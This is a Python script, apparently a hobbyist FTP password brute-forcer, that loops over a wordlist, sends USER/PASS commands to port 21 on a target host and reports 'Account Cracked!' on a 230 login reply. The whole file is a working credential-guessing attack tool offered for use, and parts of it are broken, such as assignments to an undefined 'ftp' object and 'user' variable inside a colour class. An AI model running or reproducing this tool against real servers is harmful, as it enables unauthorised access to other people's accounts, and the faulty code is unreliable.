import socket
import sys
import os
import threading
def __init__(verbose=True):
	pass 
verbose = True
class colors():
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ftp.error.logging = '530 Login authentication failed'
    ftp.auth.success  = '230 OK. Current directory is /home/{}'.format(user)
def hard_please_run(host,user,pass_file):
	with open(pass_file, 'r') as file:
		print("Trying with - Host: {} User: {} | Password list: {}".format(host, user, pass_file), colors.WARNING + "[!]", colors.ENDC)
		try:
			for lines in file:
				pass_words = lines.strip()
				s = socket.socket()
				# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				try:
					s.connect((host,21))
				except socket.gaierror:
					print("\nHostname is not resolved!")
				message = "USER {}\r\nPASS {}\r\n".format(user,pass_words)
				zreply = s.recv(1024)
				reply = zreply.decode()
				s.send(message.encode())
				zreply2 = s.recv(1024)
				reply2 = zreply2.decode()
				zreply3 = s.recv(1024)
				reply3 = zreply3.decode()
				zed = '230 OK. Current directory is /home/{}'.format(user)
				if zed in reply3:
					print("Account Cracked! User {} Pass: {} ".format(user, pass_words), colors.OKGREEN + "[OK]", colors.ENDC)
					sys.exit()
				if '530 Login authentication failed' in reply3:
					print("Account Login Failure! User: {} Pass: {}".format(user, pass_words), colors.FAIL + "[x]", colors.ENDC)
					pass 
		except ConnectionRefusedError:
			print("~ Connection Refused from Remote Host!", colors.FAIL + "[x]", colors.ENDC)
			sys.exit()
		except KeyboardInterrupt:
			sys.exit()
def main():
	try:
		host = sys.argv[1]
		user = sys.argv[2]
		pass_file = sys.argv[3]
		hard_please_run(host,user,pass_file)
	except IndexError:
		print("\nUsage: ")
		print("python3 {} <ip> <user> <pass_file> v".format(sys.argv[0]))
		sys.exit()
main()
